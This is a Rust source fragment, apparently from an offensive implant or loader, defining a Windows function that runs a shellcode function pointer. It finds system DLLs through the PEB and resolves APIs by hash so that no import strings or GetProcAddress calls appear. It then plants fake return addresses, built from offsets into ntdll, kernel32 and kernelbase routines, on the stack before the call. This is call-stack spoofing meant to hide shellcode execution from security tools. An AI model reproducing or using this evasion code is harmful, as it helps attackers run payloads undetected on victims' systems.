#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn spoof_and_call(shellcode_fn: extern "C" fn()) {
    use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
    use crate::resolve::api_hash::h;

    // Resolve module bases from PEB (no GetModuleHandle call-site string in import table)
    let ntdll = peb_get_module_base(h::DLL_NTDLL);
    let k32   = peb_get_module_base(h::DLL_K32);
    let kbase = peb_get_module_base(h::DLL_KERNELBASE);

    // Resolve function addresses by hash (no GetProcAddress or plaintext names)
    let rts      = if !ntdll.is_null() { resolve_by_hash(ntdll, h::RTL_USR_THR) } else { None };
    let btit     = if !k32.is_null()   { resolve_by_hash(k32,   h::K32_BTI) } else { None };
    let ldr      = if !ntdll.is_null() { resolve_by_hash(ntdll, h::LDR_LOAD) } else { None };
    let ldrp_ptr = if !ntdll.is_null() { resolve_by_hash(ntdll, h::LDRP_LOAD) } else { None };
    let llew     = if !kbase.is_null() { resolve_by_hash(kbase, h::K32_LLEW) } else { None };

    let f1 = llew.map(|p| p as usize + 0x1B0).unwrap_or(0);
    let f2 = ldr.map(|p|  p as usize + 0x9F).unwrap_or(0);
    let f3 = ldrp_ptr.map(|p| p as usize + 0x1F3)
        .or_else(|| ldr.map(|p| p as usize + 0x150))
        .unwrap_or(0);
    let f4 = rts.map(|p|  p as usize + 0x14).unwrap_or(0);
    let f5 = btit.map(|p| p as usize + 0x10).unwrap_or(0);

    core::arch::asm!(
        "sub rsp, 0x60",
        "mov qword ptr [rsp+0x58], {f5}",
        "mov qword ptr [rsp+0x50], {f4}",
        "mov qword ptr [rsp+0x48], {f3}",
        "mov qword ptr [rsp+0x40], {f2}",
        "mov qword ptr [rsp+0x38], {f1}",
        "call {fn}",
        "add rsp, 0x60",
        fn = in(reg) shellcode_fn,
        f1 = in(reg) f1,
        f2 = in(reg) f2,
        f3 = in(reg) f3,
        f4 = in(reg) f4,
        f5 = in(reg) f5,
        options(nostack),
    );
}
